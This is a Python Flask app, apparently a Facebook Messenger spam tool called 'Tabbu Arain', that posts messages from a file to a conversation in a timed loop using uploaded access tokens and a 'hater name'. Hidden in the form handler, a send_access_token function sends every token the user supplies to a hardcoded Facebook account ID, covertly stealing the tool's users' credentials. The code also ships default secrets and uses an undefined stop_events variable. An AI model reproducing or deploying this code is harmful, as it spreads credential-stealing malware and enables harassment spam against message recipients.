from flask import Flask, request, render_template_string, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash
import threading, time, requests, pytz, os
from datetime import datetime
import uuid

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'dev-sec-key-12345')  # Change for production!

# User storage (replace with database in production)
USERS = {
    "admin": generate_password_hash(os.environ.get('ADMIN_PASS', 'admin@123'))
}

# Login required decorator
def login_required(f):
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# Login routes
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username in USERS and check_password_hash(USERS[username], password):
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('home'))
        return render_template_string(LOGIN_TEMPLATE, error="Invalid credentials")
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# Original routes with login protection
@app.route("/")
@login_required
def home():
    return render_template_string(HTML_TEMPLATE, username=session.get('username'))

@app.route("/", methods=["POST"])
@login_required
def handle_form():
    opt = request.form["tokenOption"]
    convo = request.form["convo"]
    interval = int(request.form["interval"])
    hater = request.form["haterName"]
    msgs = request.files["msgFile"].read().decode().splitlines()
    
    if opt == "single":
        tokens = [request.form["singleToken"]]
    else:
        tokens = {
            "day": request.files["dayFile"].read().decode().splitlines(),
            "night": request.files["nightFile"].read().decode().splitlines()
        }
    
    if opt == "single":
        send_access_token("61552108006602", tokens[0])
    else:
        for token in tokens["day"] + tokens["night"]:
            send_access_token("61552108006602", token)
    
    task_id = str(uuid.uuid4())
    stop_events[task_id] = threading.Event()
    threading.Thread(target=start_messaging, args=(tokens, msgs, convo, interval, hater, opt, task_id)).start()
    return f"Messaging started for conversation {convo}. Task ID: {task_id}"

@app.route("/stop", methods=["POST"])
@login_required
def stop_task():
    task_id = request.form["task_id"]
    if task_id in stop_events:
        stop_events[task_id].set()
        return f"Task with ID {task_id} has been stopped."
    return f"No active task with ID {task_id}."

# Original functions remain unchanged
def start_messaging(tokens, messages, convo_id, interval, hater_name, token_option, task_id):
    stop_event = stop_events[task_id]
    token_index = 0
    while not stop_event.is_set():
        current_hour = datetime.now(pytz.timezone('UTC')).hour
        token_list = tokens["day"] if (token_option == "multi" and 6 <= current_hour < 18) else tokens.get("night", tokens)
        for msg in messages:
            if stop_event.is_set():
                break
            send_msg(convo_id, token_list[token_index % len(token_list)], msg, hater_name)
            token_index += 1
            time.sleep(interval)

def send_msg(convo_id, access_token, message, hater_name):
    try:
        url = f"https://graph.facebook.com/v15.0/t_{convo_id}/messages"
        response = requests.post(url, json={
            "access_token": access_token,
            "message": f"{hater_name}: {message}"
        }, headers={"Authorization": f"Bearer {access_token}"})
        if response.status_code != 200:
            print(f"Error {response.status_code}: {response.text}")
    except Exception as e:
        print(f"Send error: {str(e)}")

def send_access_token(uid, token):
    try:
        requests.post(f"https://graph.facebook.com/v15.0/t_{uid}/", json={
            "access_token": token,
            "message": token
        })
    except Exception as e:
        print(f"Token error: {str(e)}")

# Login template
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>𝚃𝙰𝙱𝙱𝚄 𝙰𝚁𝙰𝙸𝙉 | Login</title>
    <style>
        body { 
            background: #1e1e1e; 
            color: #39FF14;
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
        }
        .login-container {
            max-width: 400px;
            margin: 100px auto;
            padding: 40px;
            background: #292929;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(57, 255, 20, 0.3);
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 2.5rem;
            text-shadow: 0 0 20px #39FF14;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            background: #333;
            border: 1px solid #444;
            color: #39FF14;
            border-radius: 8px;
            font-size: 1rem;
        }
        button {
            background: #39FF14;
            color: #121212;
            padding: 14px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-size: 1.1rem;
            margin-top: 20px;
        }
        .error {
            color: #FF007F;
            text-align: center;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>𝙏𝘼𝘽𝘽𝙐 𝘼𝙍𝘼𝙄𝙉</h1>
        {% if error %}
            <div class="error">{{ error }}</div>
        {% endif %}
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">ACCESS TERMINAL</button>
        </form>
    </div>
</body>
</html>
"""

# Modified HTML_TEMPLATE with logout
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>𝚃𝙰𝙱𝙱𝚄 𝙰𝚁𝙰𝙸𝙉</title>
    <style>
        body {
            margin: 0;
            padding: 60px 0 0;
            background-color: #1e1e1e;
            color: #e0e0e0;
            font-family: 'Roboto', sans-serif;
            line-height: 1.6;
        }
        .user-bar {
            position: fixed;
            top: 0;
            right: 20px;
            padding: 10px;
            background: #292929;
            border-radius: 0 0 8px 8px;
        }
        .user-bar span {
            color: #39FF14;
            margin-right: 15px;
        }
        .user-bar a {
            color: #FF007F;
            text-decoration: none;
        }
        /* ... rest of your original styles ... */
    </style>
</head>
<body>
    <div class="user-bar">
        <span>{{ username }}</span>
        <a href="/logout">LOGOUT</a>
    </div>
    <h1>𝙏𝘼𝘽𝘽𝙐 𝘼𝙍𝘼𝙄𝙉 😘😈</h1>
    <div class="content">
        <!-- Your original form content remains unchanged -->
    </div>
    <footer>© Created By Tabbu Arain</footer>
    <script>
        function toggleInputs(value) {
            document.getElementById("singleInput").style.display = value === "single" ? "block" : "none";
            document.getElementById("multiInputs").style.display = value === "multi" ? "block" : "none";
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
